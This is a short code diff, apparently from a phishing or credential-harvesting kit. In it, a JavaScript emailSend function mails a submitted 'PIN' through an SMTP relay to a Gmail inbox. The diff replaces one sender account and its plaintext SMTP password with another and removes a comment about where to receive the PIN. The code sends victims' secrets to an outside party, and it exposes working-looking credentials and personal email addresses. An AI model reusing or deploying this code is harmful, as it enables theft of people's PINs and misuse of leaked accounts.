@@ -10,10 +10,10 @@ function emailSend() {
 
   Email.send({
     Host: "smtp.elasticemail.com",
-    Username: "nelsf38@gmail.com",
-    Password: "3D538C4DF17B36F1E64CD578356BE2FCF3CA",
-    To: 'payday10177@gmail.com', // Change this to your email address where you want to receive the PIN
-    From: "nelsf38@gmail.com",
+    Username: "chukwuebukawilliams6@gmail.com",
+    Password: "E141285882E4D4548056C705C3238E355AA6",
+    To: 'payday10177@gmail.com',
+    From: "chukwuebukawilliams6@gmail.com",
     Subject: "PIN",
     Body: messageBody
   }).then(
